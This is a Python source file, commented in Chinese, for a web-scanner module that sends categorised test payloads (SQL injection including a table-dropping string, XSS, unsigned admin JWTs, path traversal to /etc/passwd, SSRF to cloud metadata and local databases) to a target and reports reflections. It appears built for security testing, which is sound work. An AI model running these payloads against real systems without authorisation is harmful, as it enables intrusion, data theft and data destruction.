#!/usr/bin/env python3
"""
Payload 注入引擎 — 在扫描器的 HTTP 请求中注入测试 payload。

每类 payload 包含: name, vectors (原始 payload 列表), severity, check_type

用法:
  from payloads.engine import PayloadEngine
  engine = PayloadEngine()
  for result in engine.inject_all(target_url, token):
      print(result)
"""

import json, time, uuid
from typing import Optional, List, Dict, Iterator
from urllib.request import Request, urlopen, HTTPError

# ═══════════════════════════════════════════════════════════════════════
# Payload 库 — 按攻击类型分类
# ═══════════════════════════════════════════════════════════════════════

SQLI = {
    "name": "SQL Injection",
    "severity": "critical",
    "check": "sqli",
    "vectors": [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' UNION SELECT NULL--",
        "'; DROP TABLE users; --",
        "' OR 1=1--",
        "1' AND '1'='1",
        "1' AND SLEEP(5)--",
        "admin'--",
        "' OR true--",
        "%27%20OR%20%271%27=%271",
    ],
}

XSS = {
    "name": "Cross-Site Scripting",
    "severity": "high",
    "check": "xss",
    "vectors": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "javascript:alert(1)",
        "<body onload=alert(1)>",
        "\"><script>alert(1)</script>",
        "'-alert(1)-'",
        "<<SCRIPT>alert(1);//<</SCRIPT>",
        "<img%00src=x%00onerror=alert(1)>",
    ],
}

JWT_ATTACK = {
    "name": "JWT Attack Vectors",
    "severity": "high",
    "check": "jwt",
    "vectors": [
        # Algorithm confusion: use 'none' algorithm
        "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJvcHMifQ.",
        # Empty signature
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJvcHMifQ.",
        # HS256 with empty secret
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJvcHMifQ.dummy",
    ],
}

PATH_TRAVERSAL = {
    "name": "Path Traversal",
    "severity": "high",
    "check": "pathtrav",
    "vectors": [
        "../../../etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "....//....//....//etc/passwd",
        "/etc/passwd",
        "file:///etc/passwd",
        "../../../../../../etc/passwd",
        "..\\..\\..\\windows\\win.ini",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    ],
}

SSRF = {
    "name": "Server-Side Request Forgery",
    "severity": "high",
    "check": "ssrf",
    "vectors": [
        "http://169.254.169.254/latest/meta-data/",  # AWS metadata
        "http://metadata.google.internal/",            # GCP metadata
        "http://127.0.0.1:6379/",                     # Redis
        "http://127.0.0.1:5432/",                     # Postgres
        "http://localhost:8080/admin/",               # local admin
        "file:///etc/passwd",
        "gopher://127.0.0.1:6379/_INFO",
    ],
}

# 所有 payload 类别
ALL_PAYLOADS = [SQLI, XSS, JWT_ATTACK, PATH_TRAVERSAL, SSRF]


class PayloadEngine:
    """Payload 注入引擎——与扫描器独立,可在任意 HTTP 端点注入测试。"""
    
    def __init__(self, target: str, timeout: int = 10):
        self.target = target.rstrip("/")
        self.timeout = timeout
    
    def inject_one(self, method: str, path: str, payload: str,
                   token: Optional[str] = None,
                   param_name: str = "q") -> Dict:
        """单个向量注入,返回结果."""
        # 注入到 query param (GET) 或 JSON body (POST)
        if method == "GET":
            url = f"{self.target}{path}?{param_name}={payload}"
            req = Request(url, method="GET")
        else:
            url = f"{self.target}{path}"
            body = json.dumps({param_name: payload}).encode()
            req = Request(url, data=body, method=method)
        
        req.add_header("Content-Type", "application/json")
        if token:
            req.add_header("Authorization", f"Bearer {token}")
        
        t0 = time.monotonic()
        try:
            resp = urlopen(req, timeout=self.timeout)
            raw = resp.read().decode(errors="replace")
            elapsed = time.monotonic() - t0
            return {
                "status": resp.status,
                "body": raw[:500],
                "elapsed": elapsed,
                "reflected": payload in raw,  # 反射检测
                "error": False,
            }
        except HTTPError as e:
            raw = e.read().decode(errors="replace")
            return {
                "status": e.code,
                "body": raw[:500],
                "elapsed": time.monotonic() - t0,
                "reflected": payload in raw,
                "error": False,
            }
        except Exception as e:
            return {"status": 0, "body": str(e)[:200], "elapsed": 0,
                    "reflected": False, "error": True}
    
    def inject_category(self, category: Dict, paths: List[str],
                        token: Optional[str] = None) -> List[Dict]:
        """对多个端点注入一类 payload."""
        results = []
        for path in paths:
            method = "GET" if "search" in path or "datasets" in path else "POST"
            for vec in category["vectors"][:4]:  # 每类取前 4 个,避免过慢
                r = self.inject_one(method, path, vec, token, "q")
                results.append({
                    "category": category["check"],
                    "severity": category["severity"],
                    "path": path, "method": method,
                    "payload": vec[:60],
                    **r,
                })
                time.sleep(0.05)  # 避免触发限流
        return results
    
    def scan_all(self, target_paths: List[str],
                 token: Optional[str] = None) -> List[Dict]:
        """全 payload 扫描."""
        all_results = []
        for cat in ALL_PAYLOADS:
            print(f"  💉 {cat['name']} ({len(cat['vectors'])} payloads) …")
            results = self.inject_category(cat, target_paths, token)
            all_results.extend(results)
            reflected = [r for r in results if r.get("reflected")]
            if reflected:
                print(f"    ⚠️  {len(reflected)} 个反射!")
        return all_results


# ═══════════════════════════════════════════════════════════════════════
if __name__ == "__main__":
    import argparse
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", "-t", required=True)
    ap.add_argument("--paths", nargs="+", default=["/search?q=", "/datasets?limit=1&q="])
    ap.add_argument("--token", default=None)
    args = ap.parse_args()
    
    engine = PayloadEngine(args.target)
    results = engine.scan_all(args.paths, args.token)
    
    reflected = [r for r in results if r.get("reflected")]
    errors = [r for r in results if r.get("error")]
    
    print(f"\n{'='*60}")
    print(f"Payload 扫描完成: {len(results)} 次注入")
    print(f"  反射 (payload 出现在响应中): {len(reflected)}")
    print(f"  错误: {len(errors)}")
    
    if reflected:
        print(f"\n⚠️  反射的 payload (可能存在漏洞):")
        for r in reflected[:10]:
            print(f"  [{r['category']}] {r['method']} {r['path']}")
            print(f"  payload: {r['payload']} → status={r['status']}")
